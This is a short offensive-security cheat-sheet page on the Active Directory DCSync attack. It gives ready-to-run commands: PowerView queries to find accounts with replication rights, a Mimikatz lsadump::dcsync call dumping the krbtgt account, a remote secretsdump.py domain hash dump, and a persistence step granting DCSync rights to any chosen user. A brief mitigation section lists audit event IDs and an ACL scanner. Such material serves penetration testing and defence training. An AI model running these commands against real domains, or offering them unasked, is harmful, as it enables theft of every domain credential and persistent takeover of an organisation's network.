# DCSync

## DCSync

The **DCSync **permission implies having these permissions over the domain itself: **DS-Replication-Get-Changes**, **Replicating Directory Changes All **and **Replicating Directory Changes In Filtered Set**.

**Important Notes about DCSync:**

* The **DCSync attack simulates the behavior of a Domain Controller and asks other Domain Controllers to replicate information **using the Directory Replication Service Remote Protocol (MS-DRSR). Because MS-DRSR is a valid and necessary function of Active Directory, it cannot be turned off or disabled.
* By default only **Domain Admins, Enterprise Admins, Administrators, and Domain Controllers** groups have the required privileges.
* If any account passwords are stored with reversible encryption, an option is available in Mimikatz to return the password in clear text

### Enumeration

Check who has these permissions using `powerview`:

```bash
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')}
```

### Exploit Locally

```bash
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```

### Exploit Remotely
```bash
secretsdump.py -just-dc <user>:<password>@<ipaddress>
```

### Persistence

If you are a domain admin, you can grant this permissions to any user with the help of `powerview`:

```bash
Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName username -Rights DCSync -Verbose
```

Then, you can** check if the user was correctly assigned** the 3 privileges looking for them in the output of (you should be able to see the names of the privileges inside the "ObjectType" field):

```bash
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{$_.IdentityReference -match "student114"}
```

### Mitigation

* Security Event ID 4662 (Audit Policy for object must be enabled) – An operation was performed on an object
* Security Event ID 5136 (Audit Policy for object must be enabled) – A directory service object was modified
* Security Event ID 4670 (Audit Policy for object must be enabled) – Permissions on an object were changed
* AD ACL Scanner - Create and compare create reports of ACLs. [https://github.com/canix1/ADACLScanner](https://github.com/canix1/ADACLScanner)

[**More information about DCSync in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync)
[**More information about DCSync**](https://yojimbosecurity.ninja/dcsync/)
